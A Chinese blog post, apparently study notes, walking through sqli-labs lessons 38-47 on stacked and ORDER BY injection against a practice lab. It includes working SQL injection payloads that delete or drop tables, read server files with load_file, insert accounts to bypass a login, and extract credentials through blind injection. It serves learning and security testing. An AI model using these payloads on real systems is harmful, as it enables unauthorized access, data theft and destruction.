@@ -1,0 +1,1728 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="sqli_labs," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="从这里就是page3的内容了，也开始接触堆叠注入(Stack Injection)，曾经在buuctf上面也接触过几个堆叠注入的题，但都是模糊的理解。希望从接下来这几关的堆叠注入中会有新的收获。">
+<meta name="keywords" content="sqli_labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs38-65">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="从这里就是page3的内容了，也开始接触堆叠注入(Stack Injection)，曾经在buuctf上面也接触过几个堆叠注入的题，但都是模糊的理解。希望从接下来这几关的堆叠注入中会有新的收获。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;2.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;3.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;4.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;5.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;6.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;7.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;8.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;9.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;10.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;1.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;2.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;3.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;4.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;5.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;6.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;7.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;8.jpeg">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;9.jpeg">
+<meta property="og:updated_time" content="2020-04-17T01:24:31.930Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;03&#x2F;30&#x2F;sqli-labs38-65&#x2F;1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/03/30/sqli-labs38-65/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>sqli-labs38-65 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/03/30/sqli-labs38-65/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs38-65</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-30T16:54:35+08:00">
+                2020-03-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/03/30/sqli-labs38-65/" class="leancloud_visitors" data-flag-title="sqli-labs38-65">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>从这里就是page3的内容了，也开始接触堆叠注入(Stack Injection)，曾经在buuctf上面也接触过几个堆叠注入的题，但都是模糊的理解。希望从接下来这几关的堆叠注入中会有新的收获。<a id="more"></a></p>
+<h1 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h1><h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p><a href="https://www.jianshu.com/p/029d96b41232" target="_blank" rel="noopener">参考链接</a></p>
+<p>在 SQL 中，分号<code>;</code>用来表示一条 SQL 语句的结束。如果我们在<code>;</code>结束一个 SQL 语句后继续构造下一条语句，两条语句会不会一起执行？这个想法也就造就了堆叠注入。<br>而 Union Injection（联合注入）也是将两条语句合并在一起，但是<code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句</p>
+<p>例如我们输入：</p>
+<blockquote>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=1;<span class="attribute">d</span><span class="attribute">e</span><span class="attribute">l</span><span class="attribute">e</span><span class="attribute">t</span><span class="attribute">e</span> <span class="attribute">f</span><span class="attribute">r</span><span class="attribute">o</span><span class="attribute">m</span> <span class="attribute">u</span><span class="attribute">s</span><span class="attribute">e</span><span class="attribute">r</span><span class="attribute">s</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>而服务器未做检查，生成的 SQL 语句为：</p>
+<blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1;delete <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>执行后，第一条将显示查询信息，第二条将删除整个表。</p>
+<h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><p>堆叠注入并不是在每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，同时权限不足也会使攻击者无法修改数据或者调用一些程序。<br>虽然堆叠查询可以执行任意的 SQL 语句，但是这种注入方式并不是十分完美。在我们的 Web 系统中，代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面无法看到返回结果。<br>因此在读取数据时，建议使用<code>union</code>注入。同时在使用堆叠注入之前，我们也需要知道一些数据库相关信息如表名，列名等。</p>
+<h2 id="基本操作与增删查改"><a href="#基本操作与增删查改" class="headerlink" title="基本操作与增删查改"></a>基本操作与增删查改</h2><blockquote>
+<p>新建表<code>test</code><br><code>select * from users where id=1;create table test like users;</code> </p>
+<p>删除新建表<code>test</code><br><code>select * from users where id=1;drop table test;</code> </p>
+<p>查询数据<br><code>select * from users where id=1;select 1,2,3;</code> </p>
+<p>加载文件<br><code>select * from users where id=1;select load_file(&#39;c:/test.php&#39;);</code> </p>
+<p>修改数据<br><code>select * from users where id=1;insert into users(id,username,password) values(&#39;100&#39;,&#39;name&#39;,&#39;pswd&#39;);</code></p>
+</blockquote>
+<p><strong>load_file()函数</strong></p>
+<blockquote>
+<p>读取文件并返回文件内容为字符串。</p>
+<p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限；该文件所有字节可读，但文件内容必须小于<code>max_allowed_packet</code>。</p>
+<p>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回<code>NULL</code></p>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/1.png" alt>)<img src="/2020/03/30/sqli-labs38-65/2.png" alt></p>
+<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>新建表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1';<span class="keyword">create</span> <span class="keyword">table</span> cyzcc <span class="keyword">like</span> <span class="keyword">users</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/3.png" alt><br>删除表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1';<span class="keyword">drop</span> <span class="keyword">table</span> cyzcc;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/4.png" alt><br>查询数据</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>';select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure>
+
+<p>修改数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'100'</span>,<span class="string">'name'</span>,<span class="string">'pswd'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/5.png" alt></p>
+<h1 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h1><p>这一个是数字型注入，没有过滤任何东西<br>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'200'</span>,<span class="string">'cyz'</span>,<span class="string">'wc'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/6.png" alt></p>
+<h1 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h1><p>这个一测试后发现为单引号+括号闭合注入，我们可以使用盲注也可以堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'200'</span>,<span class="string">'cyz'</span>,<span class="string">'wc'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/7.png" alt></p>
+<h1 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h1><p>基于Bool_GET_数字型_盲注_堆叠注入<br>同less-39</p>
+<h1 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h1><p>这一关是一个登陆框，有忘记密码，但是不能注册<br><img src="/2020/03/30/sqli-labs38-65/8.png" alt><br>猜测是通过堆叠注入创建一个用户，然后再进行注入<br>测试后为单引号闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'123'</span>,<span class="string">'cyz'</span>,<span class="string">'999'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>然后成功登陆<br><img src="/2020/03/30/sqli-labs38-65/9.png" alt></p>
+<h1 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h1><p>这一关为单引号加）闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'1234'</span>,<span class="string">'qqq'</span>,<span class="string">'999'</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/10.png" alt></p>
+<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>这个没有回显，只能根据返回的图片判断是否为真。</p>
+<blockquote>
+<p>login_user=admin&amp;login_password=1 or 1=1–+</p>
+<p>login_user=admin&amp;login_password=1’ or 1=1–+</p>
+<p>login_user=admin&amp;login_password=1” or 1=1–+</p>
+<p>login_user=admin&amp;login_password=1’) or 1=1–+</p>
+<p>login_user=admin&amp;login_password=1”) or 1=1–+</p>
+</blockquote>
+<p>得出为单引号闭合</p>
+<h1 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h1><p>测试方法同上，增加了小括号闭合</p>
+<h1 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h1><p>基于错误_GET_数字型_排序注入<br>这关往后都是<code>order by</code>语句与<code>limit</code>语句的相关注入，对于一些会显示表格的网站，他们的 URL 中通常都会有<code>sort</code>和<code>limit</code>两个参数。</p>
+<h2 id="MySQL-语法"><a href="#MySQL-语法" class="headerlink" title="MySQL 语法"></a>MySQL 语法</h2><p>本关通过<code>sort</code>参数接收需要排序的列的序号（从1开始），MySQL 查询语句为</p>
+<blockquote>
+<p>select * from users order by $id</p>
+</blockquote>
+<p><code>sort=1 asc</code>和<code>sort=1 desc</code>，分别显示升序和降序的表格，说明此处是注入点，即注入点在<code>order by</code>后的参数中，而<code>order by</code>不同于在<code>where</code>后的注入，不能使用<code>union</code>等进行注入</p>
+<h2 id="order-by-参数注入"><a href="#order-by-参数注入" class="headerlink" title="order by 参数注入"></a>order by 参数注入</h2><p><code>order by</code>后的数字可以作为一个注入点，就是构造<code>order by</code>后的一个语句，让该语句执行结果为一个数。</p>
+<blockquote>
+<p>?sort=2</p>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/1.png" alt></p>
+<blockquote>
+<p>?sort=(select 2)</p>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/2.jpg" alt></p>
+<blockquote>
+<p>可以看到没有报错也没有预想的按第二个字段排续，说明数字没有起作用，我们考虑布尔类型</p>
+</blockquote>
+<h3 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h3><p>基于报错注入主要采用的是双注入的方法，即子查询 / 派生表，因为这里<code>order by</code>只能接一个字段，所以应当采用派生表的方法</p>
+<blockquote>
+<p>数据库名</p>
+<p>?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</p>
+</blockquote>
+<blockquote>
+<p>表名</p>
+<p>?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),floor(rand()*2))as a from information_schema.tables group by a) b)</p>
+</blockquote>
+<p>列名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>),floor(rand()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p>数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/3.jpg" alt><br>还有另一种派生表的写法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于bool盲注"><a href="#基于bool盲注" class="headerlink" title="基于bool盲注"></a>基于bool盲注</h3><p>MySQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。<br>用在<code>order by</code>后会直接导致显示不同，因为没有第0列：<br><img src="/2020/03/30/sqli-labs38-65/4.jpg" alt>)<img src="/2020/03/30/sqli-labs38-65/5.jpg" alt><br>这里我们要使用rand()函数,因为rand(0)和rand(1)返回的结果不同，但是(select …..)返回结果无变化</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand((ascii(mid((select database()),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">65</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h1><p>这一关可以使用报错注入，但是前面要使用单引号闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/6.jpg" alt><br>时间盲注也是可以的</p>
